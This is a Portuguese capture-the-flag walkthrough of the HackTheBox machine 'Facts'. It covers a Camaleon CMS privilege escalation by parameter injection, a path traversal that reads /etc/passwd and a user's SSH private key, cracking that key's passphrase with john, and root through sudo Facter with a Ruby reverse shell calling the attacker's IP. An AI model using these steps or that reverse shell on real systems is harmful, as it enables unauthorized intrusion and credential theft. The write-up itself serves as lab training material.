---
title: Facts HTB Write-up
created: 2026-03-30 16:49
tags:
  - ctf
  - hackthebox
  - rce
  - ruby
  - walkthrough
  - CVE-2025-2304
  - CVE-2024-46987
draft: false
socialImage: images/facts/facts.png
---

# Quebrando tudo: CMS CVE, OPENSSH key cracking & Ruby RCE

![Facts](images/facts/facts.png)

## Introdução

Olá mundo! Bem vindos à mais uma aventura `hackthebox`.

`Facts` é uma máquina classificada como sendo de dificuldade fácil, onde temos um servidor web com um **CMS** vulnerável a `CVE-2025-2304 Camaleon CMS Privilege Escalation` e a `CVE-2024-46987 Authenticated Path Traversal / Arbitrary File Read`. Após obter a Chave Privada **OpenSSH** do usuário `trivia`, conseguimos obter acesso remoto ao servidor principal. Em seguida podemos obter o `root` por abusar de uma falha na ferramenta `Facter` que permite uma `execução arbitrária de código`.

Vamos ver de perto como foi.

---

## Reconhecimento

### Nmap Scan

O scan do [[NMAP]] mostrou as portas **22**, **80** e **54321** abertas. Havia também um redirecionamento para `facts.htb`, então adicionei o domínio ao arquivo `hosts`em `/etc`.

```bash {5}
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
54321/tcp open  http    syn-ack ttl 62 Golang net/http server 
```

### Web

Ao acessar o domínio encontrei uma página de fatos curiosos. 

![[fac-0.png | descrição da imagem]]

Rodando a ferramenta [[Feroxbuster]] eu encontrei os diretórios `/admin/login`.

```bash {7}
--- REDACTED ---
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      124l      552w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET      121l      443w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://facts.htb/admin => http://facts.htb/admin/login
200      GET       69l      448w    30396c http://facts.htb/randomfacts/logopage2.png
200      GET       66l      519w    44082c http://facts.htb/randomfacts/primary-question-mark.png
404      GET        2l        9w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w      162c http://facts.htb/randomfacts/
404      GET      114l      371w     4836c http://facts.htb/fonts.googleapis.com/
200      GET      160l      773w    15365c http://facts.htb/finland-happiest
200      GET      160l      721w    15004c http://facts.htb/animal-sweat
--- REDACTED --- 
```

![[fac-1.png | descrição da imagem]]

Nessa página eu consegui me registrar e me logar. Ao fazer o login sou redirecionado a um **dashboard** em `/admin`.

### Painel Administrador

![[fac-2.png | descrição da imagem]]

O painel administrador não tinha muita funcionalidade pois eu não tinha acesso privilegiado. Mas no rodapé da página havia uma informação muito interessante. Nela continha a versão do **CMS** usado, o`Camaleon CMS 2.9.0`.

Essa informação me permitiu encontrar duas vulnerabilidades com criticidades CRÍTICA e ALTA - a `CVE-2025-2304 Camaleon CMS Privilege Escalation` e a `CVE-2024-46987 Authenticated Path Traversal / Arbitrary File Read` respectivamente.

---

## Acesso Inicial

Sabendo das vulnerabilidades, agora eu podia unir os pontos e alcançar meu objetivo: **a rede interna**.

### CVE-2025-2304

Essa vulnerabilidade é bem simples de explorar, pois exige apenas um proxy como o `Burpsuite`. Há também várias **POCs** prontas pra uso em Python no Github, como [essa aqui](https://raw.githubusercontent.com/predyy/CVE-2025-2304/refs/heads/main/exp.py).

Para explorar é só seguir os seguintes passos:

* Registro e login como usuário comum, sem privilégios.
* Fazer uma troca de senha e interceptar com um proxy, por exemplo `Burpsuite` ou `Caido`.
* A mudança é feita na requisição updated_ajax. Após os parâmetros de username e password, injetar o parâmetro `&password[role]=admin`. 
* Encaminhe a requisição clicando em **forward**.
* O servidor processa a requisição e atualiza os privilégios.

>[!question] Por que essa falha acontece? 
>Ela acontece devido a uma falha na filtragem dos parâmetros na atualização de perfil. O método `updated_ajax` não filtra corretamente os parâmetros, permitindo que usuários mal-intencionados modifiquem os perfis e ganhem permissões de administrador, podendo ter total acesso e controle sobre os dados sensíveis de outros usuários

Depois de executar os passos acima, eu explorei a próxima vulnerabilidade.

### CVE-2024-46987

Usando essa [POC](https://raw.githubusercontent.com/Goultarde/CVE-2024-46987/refs/heads/main/CVE-2024-46987.py) do **Github**, eu consegui ler arquivos do servidor por meio de `Path Traversal`. 

Por exemplo, eu pude ler o arquivo `passwd` que contém todos os usuários válidos do servidor.

```bash {11,12}
┌──(kali㉿kali)-[~/…/Hackthebox/Easy/Facts/tools]
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l preacher -p preacher -v /etc/passwd
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
--- REDACTED ---
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false 
```

Haviam dois usuários com diretório `/home` no servidor. Em um deles deveria estar a flag do usuário. Assim testei os dois, pois as flags de usuário no Hackthebox sempre estão no padrão `/home/usuário/user.txt`.

```bash {11}
┌──(kali㉿kali)-[~/…/Hackthebox/Easy/Facts/tools]
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l preacher -p preacher -v /home/trivia/user.txt
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
[*] Erreur HTTP 500

┌──(kali㉿kali)-[~/…/Hackthebox/Easy/Facts/tools]
└─$ python3 CVE-2024-46987.py -u http://facts.htb -l preacher -p preacher -v /home/william/user.txt
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
a22c6f2d683272152f6d382b4336c20f 
```

Bingo!! Eu tinha conseguido ler a flag do usuário!

Mas eu ainda não tinha como invadir o servidor. Eu apenas conseguia **ler** os arquivos do sistema, mas não conseguia **escrever**. Foi então que tive uma idéia.

### Chave Privada id_ed25519

>[!note] Caminho intencionado
>O passo a seguir foi bem sucedido mas se baseou em palpites, tentativas e erros. Eu não tinha percebido, mas depois de me tornar administrador no site, eu poderia ter encontrado credenciais de um bucket s3. Daí poderia me conectar ao bucket remotamente acessar a chave privada de forma mais fácil e sem frustrações. 
>Além disso, no scan do `Nmap` a porta **54321** estava aberta. Se tivesse consultado com uma IA o resultado, saberia que havia um Bucket s3 rodando com `MinIO`.

Em algumas máquinas que fiz anteriormente, eu podia acessar o servidor via SSH usando a chave privada do usuário. Foi então que procurei pela chaves `id_rsa` e `id_ed25519` nos diretórios `/.ssh` dos dois usuários. E encontrei a chave `id_ed25519` do usuário `trivia`.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Facts]
└─$ python3 tools/CVE-2024-46987.py -u http://facts.htb -l preacher2 -p preacher -v /home/trivia/.ssh/id_ed25519
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABB4Y2xFbb
win28QI30uPAEsAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAINv36AqiZfb/NuCm
7UbMlEShbiezfjKcFjPfpk6DPWzdAAAAoAuMojjProDLNef5JwveZu51yrEb0mLte4s7AH
y3atZArUT2uWTztqv1AGOT4/bLGwAHouU1EMsyIBx1tHWdz2Z/+Cki3Pa4/ygSmQv7bduF
oerp49BYWNpubB38y78rl6K7k9hnkCA2zxpQ1Z1hv/JYTWkROC6xNzChru6WGQIfIo77DX
1fRfN7BVJVm/XvpiKIbtVhpmrk67/20EbiNQc=
-----END OPENSSH PRIVATE KEY-----
```

Daí dei as permissões corretas ao arquivo.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Facts]
└─$ chmod 600 id_ed25519_trivia
```

E entrei no servidor via SSH... ou era isso o que eu achei que fosse acontecer...

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Facts]
└─$ ssh -i id_ed25519_trivia trivia@facts.htb
The authenticity of host 'facts.htb (10.129.21.113)' can't be established.
ED25519 key fingerprint is: SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'facts.htb' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_ed25519_trivia':
```

Eu ainda precisava de uma senha para entrar.

### Shell como trivia

Eu não tinha a senha, mas tinha a chave privada. Se a senha fosse fraca era possível descobrir usando a ferramenta `john the ripper`. E as senhas das máquinas do **hackthebox** costumam ser fracas propositalmente.

Usando a ferramenta `ssh2john` eu gerei um hash no formato do `john the ripper` para poder obter a senha.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Facts]
└─$ ssh2john id_ed25519_trivia
id_ed25519_trivia:$sshng$6$16$78636c456dbc229f6f10237d2e3c012c$290$6f70656e7373682d6b65792d7631000000000a6165733235362d63747200000006626372797074000000180000001078636c456dbc229f6f10237d2e3c012c0000001800000001000000330000000b7373682d6564323535313900000020dbf7e80aa265f6ff36e0a6ed46cc9444a16e27b37e329c1633dfa64e833d6cdd000000a00b8ca238cfae80cb35e7f9270bde66ee75cab11bd262ed7b8b3b007cb76ad640ad44f6b964f3b6abf5006393e3f6cb1b0007a2e53510cb32201c75b4759dcf667ff82922dcf6b8ff2812990bfb6ddb85a1eae9e3d05858da6e6c1dfccbbf2b97a2bb93d867902036cf1a50d59d61bff2584d6911382eb13730a1aeee9619021f228efb0d7d5f45f37b0552559bf5efa622886ed561a66ae4ebbff6d046e23507$24$130
```

Depois foi só usar o `john the ripper` e encontrar a senha `dragonballz`.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Facts]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt trivia_hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:07:32 0.02% (ETA: 2026-04-29 18:21) 0g/s 6.474p/s 6.474c/s 6.474C/s porkchop..123456789a
dragonballz      (id_ed25519_trivia)
1g 0:00:08:11 DONE (2026-03-29 02:33) 0.002034g/s 6.508p/s 6.508c/s 6.508C/s jhonatan..mariano
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Dessa vez eu consegui me conectar ao servidor via SSH.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Facts]
└─$ ssh -i id_ed25519_trivia trivia@facts.htb
The authenticity of host 'facts.htb (10.129.21.113)' can't be established.
ED25519 key fingerprint is: SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'facts.htb' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_ed25519_trivia':
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Mar 29 05:40:18 AM UTC 2026

  System load:           0.03
  Usage of /:            71.9% of 7.28GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             222
  Users logged in:       1
  IPv4 address for eth0: 10.129.21.113
  IPv6 address for eth0: dead:beef::250:56ff:fe94:db52


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
trivia@facts:~$
```

---

## Escalação de Privilégios

### Facter

Testando a permissão de `sudo` descobri que poderia rodar a ferramenta `Facter` como `root` e sem senha.

```bash {6}
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter 
```

>[!info] Facter
>O Facter é uma ferramenta de linha de comando leve, utilizada para coletar e exibir informações detalhadas ("fatos") sobre o sistema, como hardware, rede, sistema operacional e configurações de memória. Ele é comumente usado am automação para identificar o ambiente antes de aplicar configurações. É dái que vem o nome da máquina - *Facts*.

A ferramenta `Facter` possui uma entrada no site [gtfobins](https://gtfobins.org/gtfobins/facter/#inherit). A vulnerabilidade consiste em criar um arquivo **Ruby** malicioso e usar o parâmetro `--custom-dir=/caminho/para/o/arquivo` para forçar o programa a ler o código malicioso primeiro e executá-lo como `root`.

### Shell como root

Então primeiro criei uma shell reversa em **Ruby**.

```bash
trivia@facts:~$ vim shell.rb
trivia@facts:~$ cat shell.rb

#!/usr/bin/env ruby

require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 9001, '10.10.15.250'

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/bash -i'
```

Depois executei o programa com o parâmetro `--custom-dir=/home/trivia`, que era onde estava a shell reversa.

Na máquina alvo:

```bash
trivia@facts:~$ sudo /usr/bin/facter --custom-dir=/home/trivia
```

Na máquina atacante:

```bash
┌──(kali㉿kali)-[~/…/Hackthebox/Easy/Facts/tools]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.15.250] from (UNKNOWN) [10.129.21.113] 38692
root@facts:/home/trivia# id
id
uid=0(root) gid=0(root) groups=0(root)
root@facts:/home/trivia# whoami
whoami
root
root@facts:/home/trivia# cd
cd
root@facts:~# ls -la
ls -la
total 60
drwx------ 10 root root 4096 Mar 29 02:02 .
drwxr-xr-x 20 root root 4096 Jan 28 15:15 ..
lrwxrwxrwx  1 root root    9 Jan 26 11:40 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct  7  2024 .bashrc
drwx------  3 root root 4096 Jan 28 15:15 .cache
drwx------  3 root root 4096 Jan 28 15:15 .config
-rw-------  1 root root   20 Jan 12 08:32 .lesshst
drwxr-xr-x  3 root root 4096 Jan 28 15:15 .local
drwx------  4 root root 4096 Jan 28 15:15 .mc
drwxr-x---  2 root root 4096 Jan 28 15:15 minio-binaries
drwxr-xr-x  4 root root 4096 Jan 28 15:15 ministack
-rw-r--r--  1 root root  132 Apr  9  2025 .profile
-rw-r-----  1 root root   33 Mar 29 02:02 root.txt
drwx------  3 root root 4096 Jan 28 15:15 snap
drwx------  2 root root 4096 Jan 28 15:15 .ssh
-rw-r--r--  1 root root  165 Jan 26 11:39 .wget-hsts
root@facts:~# cat root.txt
cat root.txt
535c022ed83a6d990673627165e270d7
root@facts:~#
```

---

## Conclusão

![[factsfinal.png | descrição da imagem]]

Essa máquina possui algumas vulnerabilidades interessantes e não exige muito tempo na parte de **Reconhecimento**. Porém é necessário prestar atenção aos pequenos detalhes (exemplo: o serviço exposto na porta 54321), para não ficar perdido no caminho. 

Segue a abaixo o fluxo do ataque até chegar ao `root`:

![[Drawing 2026-03-30 22.58.43.excalidraw 1.png]]

